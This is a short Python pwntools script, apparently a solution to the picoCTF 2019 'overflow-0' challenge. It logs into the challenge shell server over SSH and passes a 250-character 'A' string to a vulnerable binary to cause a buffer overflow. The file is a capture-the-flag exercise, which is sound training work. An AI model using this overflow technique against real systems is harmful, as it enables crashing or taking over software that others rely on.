#!/usr/bin/env python

import creds
from pwn import *

DEBUG = True
BINARY = './vuln'
REMOTE = True

s = ssh(host='2019shell1.picoctf.com',
        user=creds.user,
        password=creds.pwd)

pth = '/problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a'
exe = 'vuln'
exploit = 'A' * 250

sh = s.run('cd %s; ./%s %s' % (pth, exe,exploit))
print sh.recv()
sh.close()
